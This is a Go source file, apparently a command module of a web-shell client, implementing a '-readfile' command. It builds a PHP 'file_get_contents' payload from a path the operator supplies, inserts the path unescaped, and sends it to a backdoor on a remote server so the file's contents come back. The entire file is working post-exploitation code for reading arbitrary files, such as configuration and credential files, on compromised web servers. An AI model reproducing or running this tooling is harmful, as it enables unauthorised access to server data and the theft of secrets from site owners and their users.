package phpmodule

import (
	"errors"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
	"github.com/eatbytes/razboynik/services/lister"
)

type Readfilecmd struct{}

func (read *Readfilecmd) Exec(kl *kernel.KernelLine, config *razboy.Config) error {
	var (
		action   string
		file     string
		args     []string
		err      error
		request  *razboy.REQUEST
		response *razboy.RESPONSE
	)

	args = kl.GetArr()

	if len(args) < 1 {
		return errors.New("You should give the path of the file to read")
	}

	file = args[0]

	action = "$r=file_get_contents('" + file + "');" + razboy.AddAnswer(config.Method, config.Parameter)
	request = razboy.CreateRequest(action, config)
	response, err = razboy.Send(request)

	if err != nil {
		return err
	}

	kernel.WriteSuccess(kl.GetStdout(), response.GetResult())

	return nil
}

func (read *Readfilecmd) GetName() string {
	return "-readfile"
}

func (read *Readfilecmd) GetCompleter() (kernel.CompleterFunction, bool) {
	return lister.RemotePHP, true
}

func (read *Readfilecmd) GetResult() []byte {
	return make([]byte, 0)
}

func (read *Readfilecmd) GetResultStr() string {
	return ""
}
